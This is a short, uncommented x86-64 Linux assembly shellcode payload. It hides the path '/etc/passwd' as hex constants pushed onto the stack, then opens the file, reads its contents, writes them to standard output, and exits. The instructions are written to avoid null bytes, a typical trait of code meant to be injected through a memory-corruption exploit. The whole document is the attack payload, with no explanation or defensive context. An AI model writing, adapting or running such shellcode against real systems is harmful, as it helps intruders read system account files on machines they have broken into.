global _start

section .text

_start:
        xor rax, rax
	push byte 0x64
	push word 0x7773
	mov rdi,0x7361702f6374652f
	push rdi
	lea rdi,[rsp]
	mov rsi,rax
	mov al,2
	syscall

	mov rdi, rax
        xor rax, rax
        mov rsi, rsp
        mov dx, 0xFFFF
        syscall
  
	xor rdi, rdi
	inc rdi
	mov rdx, rax
	mov rax, rdi	
	syscall
  
	xor rax, rax
	add al, 60
	syscall

